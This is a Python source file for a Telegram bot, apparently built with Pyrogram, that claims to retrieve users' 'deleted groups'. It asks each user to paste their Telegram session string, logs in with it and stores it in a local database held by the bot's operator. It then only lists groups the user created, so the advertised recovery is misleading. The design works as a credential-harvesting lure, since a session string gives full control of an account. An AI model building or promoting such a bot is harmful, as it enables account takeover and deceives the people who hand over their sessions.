from pyrogram import Client, filters, enums
from pyrogram.types import ReplyKeyboardMarkup, Message
from pyrogram.errors import SessionPasswordNeeded, AuthKeyUnregistered, ChatAdminRequired
from kvsqlite.sync import Client as Database
from datetime import datetime
from config import API_ID, API_HASH, BOT_TOKEN

# Initialize bot
bot = Client("bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Database for storing sessions
data = Database("session_data.bot")

# Full reply buttons
def create_buttons():
    return ReplyKeyboardMarkup(
        [["Start Check", "Add Session", "Show Sessions"],
         ["Current Time", "Bot Info", "Programmer"],
         ["Programmer's Channel"]],
        resize_keyboard=True
    )

@bot.on_message(filters.command("start"))
async def start(client, message: Message):
    await message.reply_video(
        "https://t.me/yyyyyy3w/31",
        caption="""
Welcome to the bot for retrieving *your deleted groups*. Send commands now.
Bot programmer: [Sofi](t.me/M02MM)
        """,
        parse_mode=enums.ParseMode.MARKDOWN,
        reply_markup=create_buttons()
    )

@bot.on_message(filters.text & ~filters.command(["start"]))
async def handle_text(client, message: Message):
    user_id = message.from_user.id
    text = message.text

    if text == "Start Check":
        await message.reply("Checking your groups...")
        await check_groups(client, user_id, message)
    elif text == "Add Session":
        await message.reply("Please send your session string.")
        data.set(f"session_status_{user_id}", "waiting")
    elif text == "Show Sessions":
        session_string = data.get(f"session_{user_id}")
        await message.reply(f"Your session: {session_string if session_string else 'No session saved.'}")
    elif text == "Programmer":
        await message.reply("- Bot Programmer: [Sofi](t.me/M02MM)", parse_mode=enums.ParseMode.MARKDOWN)
    elif text == "Programmer's Channel":
        await message.reply("- Programmer's Channel: [Python Tools](t.me/uiujq)", parse_mode=enums.ParseMode.MARKDOWN)
    elif text == "Bot Info":
        await message.reply("This bot retrieves your group data and simplifies access.")
    elif data.get(f"session_status_{user_id}") == "waiting":
        await verify_session(user_id, text, message)
        data.delete(f"session_status_{user_id}")
    elif text == "Current Time":
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        await message.reply(f"Current time: {current_time}")
    else:
        await message.reply("Invalid choice! Use the buttons or send `/start`.")

async def verify_session(user_id, session_string, message):
    try:
        user_client = Client("session_check", session_string=session_string, api_id=API_ID, api_hash=API_HASH)
        await user_client.start()
        user_info = await user_client.get_me()
        data.set(f"session_{user_id}", session_string)
        await message.reply(f"Session saved! Welcome, {user_info.first_name}.")
        await user_client.stop()
    except (AuthKeyUnregistered, SessionPasswordNeeded):
        await message.reply("Invalid session or expired session!")

async def check_groups(client, user_id, message):
    session_string = data.get(f"session_{user_id}")
    if not session_string:
        await message.reply("No valid session found. Please add your session.")
        return

    try:
        user_client = Client("group_check", session_string=session_string, api_id=API_ID, api_hash=API_HASH)
        await user_client.start()
        async for dialog in user_client.get_dialogs():
            if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP] and dialog.chat.is_creator:
                await message.reply(f"Group: {dialog.chat.title}")
        await user_client.stop()
    except Exception as e:
        await message.reply(f"Error checking groups: {e}")

bot.run()
